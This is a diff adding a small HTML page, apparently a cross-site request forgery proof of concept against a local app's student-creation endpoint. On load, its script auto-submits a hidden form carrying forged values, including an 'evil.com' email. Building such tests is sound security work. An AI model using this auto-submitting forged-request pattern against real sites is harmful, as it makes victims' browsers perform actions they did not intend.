@@ -1,0 +1,14 @@
+<html>
+  <body>
+    <form action="http://localhost:8000/students/create" method="POST">
+      <input type="hidden" name="first_name" value="A" />
+      <input type="hidden" name="last_name" value="Z" />
+      <input type="hidden" name="email" value="xyz@evil.com" />
+      <input type="hidden" name="rating" value="42" />
+    </form>
+    <script>
+      document.forms[0].submit();
+      // window.location = "https://google.com";
+    </script>
+  </body>
+</html>
